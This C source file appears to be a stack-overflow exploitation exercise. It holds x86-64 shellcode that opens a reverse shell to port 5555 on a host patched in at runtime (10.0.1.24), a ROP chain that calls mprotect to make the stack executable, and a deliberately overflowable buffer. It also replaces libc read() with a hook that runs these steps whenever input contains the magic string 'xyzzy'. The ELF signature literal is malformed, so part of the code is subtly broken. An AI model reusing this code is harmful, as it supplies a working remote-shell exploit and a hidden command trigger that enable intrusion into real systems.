#define _GNU_SOURCE
#include <arpa/inet.h>
#include <assert.h>
#include <dlfcn.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

typedef struct ShellCode {
	unsigned char prolog[18];
	unsigned short port;
	unsigned char address[4];
	unsigned char epilog[50];
} ShellCode, *ShellCodePtr;

typedef union ShellCodeUnion {
	unsigned char raw[74];
	ShellCode sc; 
} ShellCodeUnion, *ShellCodeUnionPtr;

typedef struct Payload {
	char		pl_dst[8];
	void		*pl_canary;
	void		*pl_rbp;
	void		*pl_popRDI;
	void		*pl_stackPage;
	void		*pl_popRSI;
	ptrdiff_t	pl_stackSize;
	void		*pl_popRDX;
	long		pl_permission;
	void		*pl_mprotect;
	void		*pl_shellCode;
	ShellCodeUnion	scu;
} Payload, *PayloadPtr;

static const char *s_elf_signature = "\0x7fELF";

static const char *s_magic = "xyzzy";

static const char *s_populate = "POPULATE";
static const char *s_disclose = "DISCLOSE";
static const char *s_overflow = "OVERFLOW";
static const char *s_dumpload = "DUMPLOAD";
static const char *s_testload = "TESTLOAD";

static const char *s_libc_base     = "base";
static const char *s_libc_mprotect = "mprotect";
static const char *s_libc_read     = "read";

static Payload payload = {
	.scu = {
		.raw = {
			0x6a, 0x29,					// pushq	$0x29
			0x58,						// pop		%rax
			0x99, 						// cltd
			0x6a, 0x02,					// pushq	$0x2
			0x5f,						// pop		%rdi
			0x6a, 0x01, 					// pushq	$0x1
			0x5e,						// pop		%rsi
			0x0f, 0x05,					// syscall
			0x48, 0x97,					// xchg		%rax,%rdi
			0x48, 0xb9, 0x02, 0x00,				// movabs	$0x100007fb3150002,%rcx
			0x15, 0xb3,					// .WORD	htons(5555)
			0x7f, 0x00, 0x00, 0x01,				// .DWORD	127.0.0.1
			0x51,						// push		%rcx
			0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
			0x6a, 0x10,					// pushq	$0x10
			0x5a,						// pop		%rdx
			0x6a, 0x2a,					// pushq	$0x2a
			0x58,						// pop		%rax
			0x0f, 0x05,					// syscall
			0x6a, 0x03,					// pushq	$0x3
			0x5e,						// pop		%rsi
			0x48, 0xff, 0xce,				// dec		%rsi
			0x6a, 0x21,					// pushq	$0x21
			0x58,						// pop		%rax
			0x0f, 0x05,					// syscall
			0x75, 0xf6,					// jne		27<dup2_loop>
			0x6a, 0x3b,					// pushq	$0x3b
			0x58,						// pop		%rax
			0x99,						// cltd
			0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f,	// movabs	$0x68732f6e69622f,%rbx
			0x73, 0x68, 0x00,				//
			0x53,						// push		%rbx
			0x48, 0x89, 0xe7,				// mov		%rsp,%rdi
			0x52,						// push		%rdx
			0x57,						// push		%rdi
			0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
			0x0f, 0x05					// syscall
		}
	}
};

static inline void *pageBase(void *p) {
	return (void *) (((unsigned long) p) & (-1^getpagesize()-1));
} // pageBase()

static inline void *libcBase(void *p) {
	p = pageBase(p);
	while (strncmp(p, s_elf_signature, strlen(s_elf_signature)))
		p -= getpagesize();

	return p;
} // libcBase()

static inline void *stackPage(void) {
	int dummy = 0;

	return pageBase(&dummy);
} // stackBase()

static void populate(PayloadPtr plp) {
	void *libc_mprotect = dlsym(RTLD_NEXT, s_libc_mprotect);
	void *libc_base     = libcBase(libc_mprotect);

	printf("In populate()\n");

	ptrdiff_t libc_mprotect_offset = libc_mprotect - libc_base;

	memset(plp->pl_dst, 0, sizeof(plp->pl_dst));
	plp->pl_canary		= NULL;
	plp->pl_rbp		= NULL; // The function RIP is next, but we'll force a ROP chain from here.
	plp->pl_popRDI		= &&l_poprdi;
	plp->pl_stackPage	= stackPage();
	plp->pl_popRSI		= &&l_poprsi;
	plp->pl_stackSize	= getpagesize();
	plp->pl_popRDX		= &&l_poprdx;
	plp->pl_permission	= 0x7;
	plp->pl_mprotect	= libc_mprotect;
	plp->pl_shellCode	= &plp->scu; // Must be updated whenever *plp moves

	plp->scu.sc.port	= htons(5555);
	plp->scu.sc.address[0]	= 10; //127;
	plp->scu.sc.address[1]	= 0;  //0;
	plp->scu.sc.address[2]	= 1;  //0;
	plp->scu.sc.address[3]	= 24; //1;

	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
	int volatile v = 0;

	// Gadget for "POP RDI"
	if (v) {
l_poprdi:
		__asm__ ("pop %rdi");
		__asm__ ("ret");
	}

	// Gadget for "POP RSI"
	if (v) {
l_poprsi:
		__asm__ ("pop %rsi");
		__asm__ ("ret");
	}

	// Gadget for "POP RDX"
	if (v) {
l_poprdx:
		__asm__ ("pop %rdx");
		__asm__ ("ret");
	}

	return;
} // populate()

static void disclose(PayloadPtr plp) {
	void *libc_mprotect   = dlsym(RTLD_NEXT, s_libc_mprotect);
	void *libc_read       = dlsym(RTLD_NEXT, s_libc_read);
	void *libc_base       = libcBase(libc_mprotect);

	printf("In disclose()\n");

	ptrdiff_t libc_mprotect_offset   = libc_mprotect - libc_base;

	printf("--------------------------------------------\n");
	printf("%20s: %p\n",           s_libc_base,       libc_base);
	printf("%20s: %p (0x%08tx)\n", s_libc_mprotect,   libc_mprotect, libc_mprotect_offset);
	printf("--------------------------------------------\n");
} // disclose()

static void dumpload(PayloadPtr plp) {
	printf("In dumpload()\n");

	printf("--------------------------------------------\n");
	printf("%20s: %p\n",           "plp->pl_canary",       plp->pl_canary);
	printf("%20s: %p\n",           "plp->pl_rbp",          plp->pl_rbp);
	printf("%20s: %p\n",           "plp->pl_popRDI",       plp->pl_popRDI);
	printf("%20s: %p\n",           "plp->pl_stackPage",    plp->pl_stackPage);
	printf("%20s: %p\n",           "plp->pl_popRSI",       plp->pl_popRSI);
	printf("%20s: %#tx\n",         "plp->pl_stackSize",    plp->pl_stackSize);
	printf("%20s: %p\n",           "plp->pl_popRDX",       plp->pl_popRDX);
	printf("%20s: %#tx\n",         "plp->pl_permission",   plp->pl_permission);
	printf("%20s: %p\n",           "plp->pl_mprotect",     plp->pl_mprotect);
	printf("%20s: %p\n",           "plp->pl_shellCode",    plp->pl_shellCode);
	printf("%20s: %d\n",           "plp->scu.sc.port",     ntohs(plp->scu.sc.port));
	printf("%20s: %d.%d.%d.%d\n",  "plp->scu.sc.address",  plp->scu.sc.address[0], plp->scu.sc.address[1], plp->scu.sc.address[2], plp->scu.sc.address[3]);
	printf("--------------------------------------------\n");
} // dumpload()

static void overflow(char *src, size_t n) {
	char dst[8] = {0};

	printf("In overflow()");

	memcpy(dst, src, n);
} // overflow()

static void testload(PayloadPtr plp, size_t n) {
	char dst[8] = {0};

	printf("In testload()\n");

	// Help the hacker by populating the payload with the correct canary and saved frame pointer
	memcpy(plp->pl_dst, dst, sizeof(plp->pl_dst) + sizeof(plp->pl_canary) + sizeof(plp->pl_rbp));

	plp->pl_shellCode = &dst[0] + ((void *)(&plp->scu) - (void *)plp);
	plp->pl_shellCode = ((void *) &dst) + ((void *)(&plp->scu) - (void *)plp);
} // testload()

ssize_t read(int fd, void *buf, size_t count) {
	ssize_t (*real_read)(int fd, void *buf, size_t count) = real_read = dlsym(RTLD_NEXT, s_libc_read);

	ssize_t result = real_read(fd, buf, count);
	char *p = (result < strlen(s_magic)) ? NULL : strstr(buf, s_magic);

	if (p)
	{
		p += strlen(s_magic);
		if (!strncmp(s_populate, p, strlen(s_populate)))
			populate(&payload);
		else if (!strncmp(s_disclose, p, strlen(s_disclose)))
			disclose(&payload);
		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
			dumpload(&payload);
		else if (!strncmp(s_testload, p, strlen(s_testload)))
			testload(&payload, sizeof(payload));
		else if (!strncmp(s_overflow, p, strlen(s_overflow)))
			overflow(p, result - (p - (char *) buf));
	} // if

	return result;
} // read()

int main(int argc, char **argv)
{
	assert(sizeof(short) == 2);
	assert(sizeof(int) == 4);
	assert(sizeof(long) == 8);
	assert(sizeof(void *) == 8);
	assert(sizeof(ptrdiff_t) == 8);
	assert(sizeof(ShellCodeUnion) == 74);
	assert(sizeof(unsigned short) == 2);
	assert(getpagesize() == 4096);
	assert((-1^(getpagesize()-1))==0xfffffffffffff000);

	populate(&payload);
	disclose(&payload);
	dumpload(&payload);
	testload(&payload, sizeof(payload));
	overflow((char *) &payload, sizeof(payload));
} // main()
